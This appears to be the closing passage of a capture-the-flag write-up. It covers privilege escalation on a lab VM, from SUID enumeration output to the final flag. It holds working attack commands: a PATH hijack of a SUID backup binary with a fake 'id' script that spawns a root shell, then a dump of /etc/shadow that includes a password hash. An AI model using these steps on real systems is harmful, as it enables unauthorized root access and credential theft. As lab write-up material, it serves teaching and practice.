find: '/proc/331/map_files': Permission denied
find: '/proc/331/fdinfo': Permission denied
find: '/proc/331/ns': Permission denied
find: '/proc/332/task/332/fd': Permission denied
find: '/proc/332/task/332/fdinfo': Permission denied
find: '/proc/332/task/332/ns': Permission denied
find: '/proc/332/fd': Permission denied
find: '/proc/332/map_files': Permission denied
find: '/proc/332/fdinfo': Permission denied
find: '/proc/332/ns': Permission denied
find: '/proc/371/task/371/fd': Permission denied
find: '/proc/371/task/371/fdinfo': Permission denied
find: '/proc/371/task/371/ns': Permission denied
find: '/proc/371/fd': Permission denied
find: '/proc/371/map_files': Permission denied
find: '/proc/371/fdinfo': Permission denied
find: '/proc/371/ns': Permission denied
find: '/proc/401/task/401/fd': Permission denied
find: '/proc/401/task/401/fdinfo': Permission denied
find: '/proc/401/task/401/ns': Permission denied
find: '/proc/401/fd': Permission denied
find: '/proc/401/map_files': Permission denied
find: '/proc/401/fdinfo': Permission denied
find: '/proc/401/ns': Permission denied
find: '/proc/419/task/419/fd': Permission denied
find: '/proc/419/task/419/fdinfo': Permission denied
find: '/proc/419/task/419/ns': Permission denied
find: '/proc/419/fd': Permission denied
find: '/proc/419/map_files': Permission denied
find: '/proc/419/fdinfo': Permission denied
find: '/proc/419/ns': Permission denied
find: '/proc/424/task/424/fd': Permission denied
find: '/proc/424/task/424/fdinfo': Permission denied
find: '/proc/424/task/424/ns': Permission denied
find: '/proc/424/fd': Permission denied
find: '/proc/424/map_files': Permission denied
find: '/proc/424/fdinfo': Permission denied
find: '/proc/424/ns': Permission denied
find: '/proc/427/task/427/fd': Permission denied
find: '/proc/427/task/427/fdinfo': Permission denied
find: '/proc/427/task/427/ns': Permission denied
find: '/proc/427/fd': Permission denied
find: '/proc/427/map_files': Permission denied
find: '/proc/427/fdinfo': Permission denied
find: '/proc/427/ns': Permission denied
find: '/proc/428/task/428/fd': Permission denied
find: '/proc/428/task/428/fdinfo': Permission denied
find: '/proc/428/task/428/ns': Permission denied
find: '/proc/428/fd': Permission denied
find: '/proc/428/map_files': Permission denied
find: '/proc/428/fdinfo': Permission denied
find: '/proc/428/ns': Permission denied
find: '/proc/429/task/429/fd': Permission denied
find: '/proc/429/task/429/fdinfo': Permission denied
find: '/proc/429/task/429/ns': Permission denied
find: '/proc/429/fd': Permission denied
find: '/proc/429/map_files': Permission denied
find: '/proc/429/fdinfo': Permission denied
find: '/proc/429/ns': Permission denied
find: '/proc/431/task/431/fd': Permission denied
find: '/proc/431/task/431/fdinfo': Permission denied
find: '/proc/431/task/431/ns': Permission denied
find: '/proc/431/fd': Permission denied
find: '/proc/431/map_files': Permission denied
find: '/proc/431/fdinfo': Permission denied
find: '/proc/431/ns': Permission denied
find: '/proc/432/task/432/fd': Permission denied
find: '/proc/432/task/432/fdinfo': Permission denied
find: '/proc/432/task/432/ns': Permission denied
find: '/proc/432/fd': Permission denied
find: '/proc/432/map_files': Permission denied
find: '/proc/432/fdinfo': Permission denied
find: '/proc/432/ns': Permission denied
find: '/proc/433/task/433/fd': Permission denied
find: '/proc/433/task/433/fdinfo': Permission denied
find: '/proc/433/task/433/ns': Permission denied
find: '/proc/433/fd': Permission denied
find: '/proc/433/map_files': Permission denied
find: '/proc/433/fdinfo': Permission denied
find: '/proc/433/ns': Permission denied
find: '/proc/445/task/445/fd': Permission denied
find: '/proc/445/task/445/fdinfo': Permission denied
find: '/proc/445/task/445/ns': Permission denied
find: '/proc/445/fd': Permission denied
find: '/proc/445/map_files': Permission denied
find: '/proc/445/fdinfo': Permission denied
find: '/proc/445/ns': Permission denied
find: '/proc/522/task/522/fd': Permission denied
find: '/proc/522/task/522/fdinfo': Permission denied
find: '/proc/522/task/522/ns': Permission denied
find: '/proc/522/task/532/fd': Permission denied
find: '/proc/522/task/532/fdinfo': Permission denied
find: '/proc/522/task/532/ns': Permission denied
find: '/proc/522/fd': Permission denied
find: '/proc/522/map_files': Permission denied
find: '/proc/522/fdinfo': Permission denied
find: '/proc/522/ns': Permission denied
find: '/proc/543/task/543/fd': Permission denied
find: '/proc/543/task/543/fdinfo': Permission denied
find: '/proc/543/task/543/ns': Permission denied
find: '/proc/543/fd': Permission denied
find: '/proc/543/map_files': Permission denied
find: '/proc/543/fdinfo': Permission denied
find: '/proc/543/ns': Permission denied
find: '/proc/664/task/664/fd': Permission denied
find: '/proc/664/task/664/fdinfo': Permission denied
find: '/proc/664/task/664/ns': Permission denied
find: '/proc/664/fd': Permission denied
find: '/proc/664/map_files': Permission denied
find: '/proc/664/fdinfo': Permission denied
find: '/proc/664/ns': Permission denied
find: '/proc/865/task/865/fd': Permission denied
find: '/proc/865/task/865/fdinfo': Permission denied
find: '/proc/865/task/865/ns': Permission denied
find: '/proc/865/fd': Permission denied
find: '/proc/865/map_files': Permission denied
find: '/proc/865/fdinfo': Permission denied
find: '/proc/865/ns': Permission denied
find: '/proc/943/task/943/fd': Permission denied
find: '/proc/943/task/943/fdinfo': Permission denied
find: '/proc/943/task/943/ns': Permission denied
find: '/proc/943/task/959/fd': Permission denied
find: '/proc/943/task/959/fdinfo': Permission denied
find: '/proc/943/task/959/ns': Permission denied
find: '/proc/943/task/960/fd': Permission denied
find: '/proc/943/task/960/fdinfo': Permission denied
find: '/proc/943/task/960/ns': Permission denied
find: '/proc/943/task/2344/fd': Permission denied
find: '/proc/943/task/2344/fdinfo': Permission denied
find: '/proc/943/task/2344/ns': Permission denied
find: '/proc/943/task/2345/fd': Permission denied
find: '/proc/943/task/2345/fdinfo': Permission denied
find: '/proc/943/task/2345/ns': Permission denied
find: '/proc/943/task/2346/fd': Permission denied
find: '/proc/943/task/2346/fdinfo': Permission denied
find: '/proc/943/task/2346/ns': Permission denied
find: '/proc/943/task/2347/fd': Permission denied
find: '/proc/943/task/2347/fdinfo': Permission denied
find: '/proc/943/task/2347/ns': Permission denied
find: '/proc/943/task/2348/fd': Permission denied
find: '/proc/943/task/2348/fdinfo': Permission denied
find: '/proc/943/task/2348/ns': Permission denied
find: '/proc/943/task/2349/fd': Permission denied
find: '/proc/943/task/2349/fdinfo': Permission denied
find: '/proc/943/task/2349/ns': Permission denied
find: '/proc/943/task/2350/fd': Permission denied
find: '/proc/943/task/2350/fdinfo': Permission denied
find: '/proc/943/task/2350/ns': Permission denied
find: '/proc/943/task/2351/fd': Permission denied
find: '/proc/943/task/2351/fdinfo': Permission denied
find: '/proc/943/task/2351/ns': Permission denied
find: '/proc/943/fd': Permission denied
find: '/proc/943/map_files': Permission denied
find: '/proc/943/fdinfo': Permission denied
find: '/proc/943/ns': Permission denied
find: '/proc/947/task/947/fd': Permission denied
find: '/proc/947/task/947/fdinfo': Permission denied
find: '/proc/947/task/947/ns': Permission denied
find: '/proc/947/fd': Permission denied
find: '/proc/947/map_files': Permission denied
find: '/proc/947/fdinfo': Permission denied
find: '/proc/947/ns': Permission denied
find: '/proc/961/task/961/fd': Permission denied
find: '/proc/961/task/961/fdinfo': Permission denied
find: '/proc/961/task/961/ns': Permission denied
find: '/proc/961/task/1045/fd': Permission denied
find: '/proc/961/task/1045/fdinfo': Permission denied
find: '/proc/961/task/1045/ns': Permission denied
find: '/proc/961/task/1048/fd': Permission denied
find: '/proc/961/task/1048/fdinfo': Permission denied
find: '/proc/961/task/1048/ns': Permission denied
find: '/proc/961/fd': Permission denied
find: '/proc/961/map_files': Permission denied
find: '/proc/961/fdinfo': Permission denied
find: '/proc/961/ns': Permission denied
find: '/proc/963/task/963/fd': Permission denied
find: '/proc/963/task/963/fdinfo': Permission denied
find: '/proc/963/task/963/ns': Permission denied
find: '/proc/963/fd': Permission denied
find: '/proc/963/map_files': Permission denied
find: '/proc/963/fdinfo': Permission denied
find: '/proc/963/ns': Permission denied
find: '/proc/969/task/969/fd': Permission denied
find: '/proc/969/task/969/fdinfo': Permission denied
find: '/proc/969/task/969/ns': Permission denied
find: '/proc/969/task/1042/fd': Permission denied
find: '/proc/969/task/1042/fdinfo': Permission denied
find: '/proc/969/task/1042/ns': Permission denied
find: '/proc/969/task/1043/fd': Permission denied
find: '/proc/969/task/1043/fdinfo': Permission denied
find: '/proc/969/task/1043/ns': Permission denied
find: '/proc/969/task/1044/fd': Permission denied
find: '/proc/969/task/1044/fdinfo': Permission denied
find: '/proc/969/task/1044/ns': Permission denied
find: '/proc/969/fd': Permission denied
find: '/proc/969/map_files': Permission denied
find: '/proc/969/fdinfo': Permission denied
find: '/proc/969/ns': Permission denied
find: '/proc/973/task/973/fd': Permission denied
find: '/proc/973/task/973/fdinfo': Permission denied
find: '/proc/973/task/973/ns': Permission denied
find: '/proc/973/fd': Permission denied
find: '/proc/973/map_files': Permission denied
find: '/proc/973/fdinfo': Permission denied
find: '/proc/973/ns': Permission denied
find: '/proc/976/task/976/fd': Permission denied
find: '/proc/976/task/976/fdinfo': Permission denied
find: '/proc/976/task/976/ns': Permission denied
find: '/proc/976/fd': Permission denied
find: '/proc/976/map_files': Permission denied
find: '/proc/976/fdinfo': Permission denied
find: '/proc/976/ns': Permission denied
find: '/proc/977/task/977/fd': Permission denied
find: '/proc/977/task/977/fdinfo': Permission denied
find: '/proc/977/task/977/ns': Permission denied
find: '/proc/977/fd': Permission denied
find: '/proc/977/map_files': Permission denied
find: '/proc/977/fdinfo': Permission denied
find: '/proc/977/ns': Permission denied
find: '/proc/982/task/982/fd': Permission denied
find: '/proc/982/task/982/fdinfo': Permission denied
find: '/proc/982/task/982/ns': Permission denied
find: '/proc/982/task/1091/fd': Permission denied
find: '/proc/982/task/1091/fdinfo': Permission denied
find: '/proc/982/task/1091/ns': Permission denied
find: '/proc/982/task/1092/fd': Permission denied
find: '/proc/982/task/1092/fdinfo': Permission denied
find: '/proc/982/task/1092/ns': Permission denied
find: '/proc/982/task/1123/fd': Permission denied
find: '/proc/982/task/1123/fdinfo': Permission denied
find: '/proc/982/task/1123/ns': Permission denied
find: '/proc/982/task/1231/fd': Permission denied
find: '/proc/982/task/1231/fdinfo': Permission denied
find: '/proc/982/task/1231/ns': Permission denied
find: '/proc/982/task/1232/fd': Permission denied
find: '/proc/982/task/1232/fdinfo': Permission denied
find: '/proc/982/task/1232/ns': Permission denied
find: '/proc/982/fd': Permission denied
find: '/proc/982/map_files': Permission denied
find: '/proc/982/fdinfo': Permission denied
find: '/proc/982/ns': Permission denied
find: '/proc/1035/task/1035/fd': Permission denied
find: '/proc/1035/task/1035/fdinfo': Permission denied
find: '/proc/1035/task/1035/ns': Permission denied
find: '/proc/1035/fd': Permission denied
find: '/proc/1035/map_files': Permission denied
find: '/proc/1035/fdinfo': Permission denied
find: '/proc/1035/ns': Permission denied
find: '/proc/1110/task/1110/fd': Permission denied
find: '/proc/1110/task/1110/fdinfo': Permission denied
find: '/proc/1110/task/1110/ns': Permission denied
find: '/proc/1110/fd': Permission denied
find: '/proc/1110/map_files': Permission denied
find: '/proc/1110/fdinfo': Permission denied
find: '/proc/1110/ns': Permission denied
find: '/proc/1120/task/1120/fd': Permission denied
find: '/proc/1120/task/1120/fdinfo': Permission denied
find: '/proc/1120/task/1120/ns': Permission denied
find: '/proc/1120/task/1132/fd': Permission denied
find: '/proc/1120/task/1132/fdinfo': Permission denied
find: '/proc/1120/task/1132/ns': Permission denied
find: '/proc/1120/task/1134/fd': Permission denied
find: '/proc/1120/task/1134/fdinfo': Permission denied
find: '/proc/1120/task/1134/ns': Permission denied
find: '/proc/1120/fd': Permission denied
find: '/proc/1120/map_files': Permission denied
find: '/proc/1120/fdinfo': Permission denied
find: '/proc/1120/ns': Permission denied
find: '/proc/1138/task/1138/fd': Permission denied
find: '/proc/1138/task/1138/fdinfo': Permission denied
find: '/proc/1138/task/1138/ns': Permission denied
find: '/proc/1138/fd': Permission denied
find: '/proc/1138/map_files': Permission denied
find: '/proc/1138/fdinfo': Permission denied
find: '/proc/1138/ns': Permission denied
find: '/proc/1139/task/1139/fd': Permission denied
find: '/proc/1139/task/1139/fdinfo': Permission denied
find: '/proc/1139/task/1139/ns': Permission denied
find: '/proc/1139/fd': Permission denied
find: '/proc/1139/map_files': Permission denied
find: '/proc/1139/fdinfo': Permission denied
find: '/proc/1139/ns': Permission denied
find: '/proc/1202/task/1202/fd': Permission denied
find: '/proc/1202/task/1202/fdinfo': Permission denied
find: '/proc/1202/task/1202/ns': Permission denied
find: '/proc/1202/fd': Permission denied
find: '/proc/1202/map_files': Permission denied
find: '/proc/1202/fdinfo': Permission denied
find: '/proc/1202/ns': Permission denied
find: '/proc/1221/task/1221/fd': Permission denied
find: '/proc/1221/task/1221/fdinfo': Permission denied
find: '/proc/1221/task/1221/ns': Permission denied
find: '/proc/1221/fd': Permission denied
find: '/proc/1221/map_files': Permission denied
find: '/proc/1221/fdinfo': Permission denied
find: '/proc/1221/ns': Permission denied
find: '/proc/1222/task/1222/fd': Permission denied
find: '/proc/1222/task/1222/fdinfo': Permission denied
find: '/proc/1222/task/1222/ns': Permission denied
find: '/proc/1222/fd': Permission denied
find: '/proc/1222/map_files': Permission denied
find: '/proc/1222/fdinfo': Permission denied
find: '/proc/1222/ns': Permission denied
find: '/proc/1223/task/1223/fd': Permission denied
find: '/proc/1223/task/1223/fdinfo': Permission denied
find: '/proc/1223/task/1223/ns': Permission denied
find: '/proc/1223/fd': Permission denied
find: '/proc/1223/map_files': Permission denied
find: '/proc/1223/fdinfo': Permission denied
find: '/proc/1223/ns': Permission denied
find: '/proc/1224/task/1224/fd': Permission denied
find: '/proc/1224/task/1224/fdinfo': Permission denied
find: '/proc/1224/task/1224/ns': Permission denied
find: '/proc/1224/fd': Permission denied
find: '/proc/1224/map_files': Permission denied
find: '/proc/1224/fdinfo': Permission denied
find: '/proc/1224/ns': Permission denied
find: '/proc/1225/task/1225/fd': Permission denied
find: '/proc/1225/task/1225/fdinfo': Permission denied
find: '/proc/1225/task/1225/ns': Permission denied
find: '/proc/1225/fd': Permission denied
find: '/proc/1225/map_files': Permission denied
find: '/proc/1225/fdinfo': Permission denied
find: '/proc/1225/ns': Permission denied
find: '/proc/1226/task/1226/fd': Permission denied
find: '/proc/1226/task/1226/fdinfo': Permission denied
find: '/proc/1226/task/1226/ns': Permission denied
find: '/proc/1226/fd': Permission denied
find: '/proc/1226/map_files': Permission denied
find: '/proc/1226/fdinfo': Permission denied
find: '/proc/1226/ns': Permission denied
find: '/proc/1227/task/1227/fd': Permission denied
find: '/proc/1227/task/1227/fdinfo': Permission denied
find: '/proc/1227/task/1227/ns': Permission denied
find: '/proc/1227/fd': Permission denied
find: '/proc/1227/map_files': Permission denied
find: '/proc/1227/fdinfo': Permission denied
find: '/proc/1227/ns': Permission denied
find: '/proc/1228/task/1228/fd': Permission denied
find: '/proc/1228/task/1228/fdinfo': Permission denied
find: '/proc/1228/task/1228/ns': Permission denied
find: '/proc/1228/fd': Permission denied
find: '/proc/1228/map_files': Permission denied
find: '/proc/1228/fdinfo': Permission denied
find: '/proc/1228/ns': Permission denied
find: '/proc/1229/task/1229/fd': Permission denied
find: '/proc/1229/task/1229/fdinfo': Permission denied
find: '/proc/1229/task/1229/ns': Permission denied
find: '/proc/1229/fd': Permission denied
find: '/proc/1229/map_files': Permission denied
find: '/proc/1229/fdinfo': Permission denied
find: '/proc/1229/ns': Permission denied
find: '/proc/1230/task/1230/fd': Permission denied
find: '/proc/1230/task/1230/fdinfo': Permission denied
find: '/proc/1230/task/1230/ns': Permission denied
find: '/proc/1230/fd': Permission denied
find: '/proc/1230/map_files': Permission denied
find: '/proc/1230/fdinfo': Permission denied
find: '/proc/1230/ns': Permission denied
find: '/proc/1242/task/1242/fd': Permission denied
find: '/proc/1242/task/1242/fdinfo': Permission denied
find: '/proc/1242/task/1242/ns': Permission denied
find: '/proc/1242/fd': Permission denied
find: '/proc/1242/map_files': Permission denied
find: '/proc/1242/fdinfo': Permission denied
find: '/proc/1242/ns': Permission denied
find: '/proc/1244/task/1244/fd': Permission denied
find: '/proc/1244/task/1244/fdinfo': Permission denied
find: '/proc/1244/task/1244/ns': Permission denied
find: '/proc/1244/fd': Permission denied
find: '/proc/1244/map_files': Permission denied
find: '/proc/1244/fdinfo': Permission denied
find: '/proc/1244/ns': Permission denied
find: '/proc/2267/task/2267/fd': Permission denied
find: '/proc/2267/task/2267/fdinfo': Permission denied
find: '/proc/2267/task/2267/ns': Permission denied
find: '/proc/2267/fd': Permission denied
find: '/proc/2267/map_files': Permission denied
find: '/proc/2267/fdinfo': Permission denied
find: '/proc/2267/ns': Permission denied
find: '/proc/2321/task/2321/fd': Permission denied
find: '/proc/2321/task/2321/fdinfo': Permission denied
find: '/proc/2321/task/2321/ns': Permission denied
find: '/proc/2321/fd': Permission denied
find: '/proc/2321/map_files': Permission denied
find: '/proc/2321/fdinfo': Permission denied
find: '/proc/2321/ns': Permission denied
find: '/proc/2337/task/2337/fd': Permission denied
find: '/proc/2337/task/2337/fdinfo': Permission denied
find: '/proc/2337/task/2337/ns': Permission denied
find: '/proc/2337/fd': Permission denied
find: '/proc/2337/map_files': Permission denied
find: '/proc/2337/fdinfo': Permission denied
find: '/proc/2337/ns': Permission denied
find: '/proc/2352/task/2352/fd': Permission denied
find: '/proc/2352/task/2352/fdinfo': Permission denied
find: '/proc/2352/task/2352/ns': Permission denied
find: '/proc/2352/fd': Permission denied
find: '/proc/2352/map_files': Permission denied
find: '/proc/2352/fdinfo': Permission denied
find: '/proc/2352/ns': Permission denied
find: '/proc/2367/task/2367/fd': Permission denied
find: '/proc/2367/task/2367/fdinfo': Permission denied
find: '/proc/2367/task/2367/ns': Permission denied
find: '/proc/2367/fd': Permission denied
find: '/proc/2367/map_files': Permission denied
find: '/proc/2367/fdinfo': Permission denied
find: '/proc/2367/ns': Permission denied
find: '/proc/2880/task/2880/fd': Permission denied
find: '/proc/2880/task/2880/fdinfo': Permission denied
find: '/proc/2880/task/2880/ns': Permission denied
find: '/proc/2880/fd': Permission denied
find: '/proc/2880/map_files': Permission denied
find: '/proc/2880/fdinfo': Permission denied
find: '/proc/2880/ns': Permission denied
find: '/proc/2890/task/2890/fd/8': No such file or directory
find: '/proc/2890/task/2890/fdinfo/8': No such file or directory
find: '/proc/2890/fd/7': No such file or directory
find: '/proc/2890/fdinfo/7': No such file or directory
find: '/run/lxcfs': Permission denied
find: '/run/sudo': Permission denied
find: '/run/log/journal/8e3439a6ff1d009b6761b11458b3f76a': Permission denied
find: '/run/lvm': Permission denied
find: '/run/systemd/inaccessible': Permission denied
find: '/run/lock/lvm': Permission denied
find: '/sys/fs/fuse/connections/39': Permission denied
find: '/sys/kernel/debug': Permission denied
find: '/home/skuzzy/.cache': Permission denied
find: '/root': Permission denied
find: '/lost+found': Permission denied
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/sudo
/bin/fusermount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/bin/ping6
/bin/umount
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/polkit-1': Permission denied
find: '/var/lib/php/sessions': Permission denied
find: '/var/tmp/systemd-private-0dde0c27c8f24c1094cf23211c051214-systemd-timesyncd.service-kZyOIA': Permission denied
find: '/var/log/unattended-upgrades': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/rsyslog': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
/opt/alicebackup 
```

Suspicious file /opt/alicebackup

```bash
/opt/alicebackup
uid=0(root) gid=0(root) groups=0(root),33(www-data)
ssh: Could not resolve hostname alice.home: Temporary failure in name resolution
lost connection
```

Probably the env path can be abused

```bash
cd /tmp
mkdir evil
export PATH=/tmp/evil:$PATH
env
USER=www-data
HOME=/var/www
OLDPWD=/
PATH=/tmp/evil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/tmp
echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'" >> /tmp/evil/ssh
cat /tmp/evil/ssh
python -c 'import pty; pty.spawn("/bin/sh")'
chmod 755 /tmp/evil/ssh
/opt/alicebackup
uid=0(root) gid=0(root) groups=0(root),33(www-data)
ssh: Could not resolve hostname alice.home: Temporary failure in name resolution
lost connection
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ssh is not working. Trying with id since in the application output it shows a line with the user level

```bash
strings /opt/alicebackup
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
=i	 
=J	 
AWAVA
AUATL
[]A\A]A^A_
scp /tmp/special bob@alice.home:~
;*3$"
GCC: (Debian 6.3.0-6) 6.3.0 20170205
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6962
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
root.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment

cp /tmp/evil/ssh /tmp/evil/id
/opt/alicebackup
# id
id
# cat /etc/shadow
cat /etc/shadow
root:!:17224:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
sys:*:17212:0:99999:7:::
sync:*:17212:0:99999:7:::
games:*:17212:0:99999:7:::
man:*:17212:0:99999:7:::
lp:*:17212:0:99999:7:::
mail:*:17212:0:99999:7:::
news:*:17212:0:99999:7:::
uucp:*:17212:0:99999:7:::
proxy:*:17212:0:99999:7:::
www-data:*:17212:0:99999:7:::
backup:*:17212:0:99999:7:::
list:*:17212:0:99999:7:::
irc:*:17212:0:99999:7:::
gnats:*:17212:0:99999:7:::
nobody:*:17212:0:99999:7:::
systemd-timesync:*:17212:0:99999:7:::
systemd-network:*:17212:0:99999:7:::
systemd-resolve:*:17212:0:99999:7:::
systemd-bus-proxy:*:17212:0:99999:7:::
syslog:*:17212:0:99999:7:::
_apt:*:17212:0:99999:7:::
lxd:*:17224:0:99999:7:::
messagebus:*:17224:0:99999:7:::
uuidd:*:17224:0:99999:7:::
dnsmasq:*:17224:0:99999:7:::
skuzzy:$6$f9a5ANk6$iNyb2BjyPW/AfqF/zZ.MTEYlIZdR6rvVTMlqXyLFCy9fccYq1NKGiw.NUecJTtO2yQdAZsPIDI2.CU1edoZpF/:17224:0:99999:7:::
sshd:*:17224:0:99999:7:::
# 
```

Last flag

```bash
# cd /root
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
Congratulations!

flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}

You've found the final flag and pwned this CTF VM!

I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!

I'd love to hear your thoughts on this one.
Too easy?
Too hard?
Too much stuff to install to get the iSCSI initiator working?

Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net


# 
```
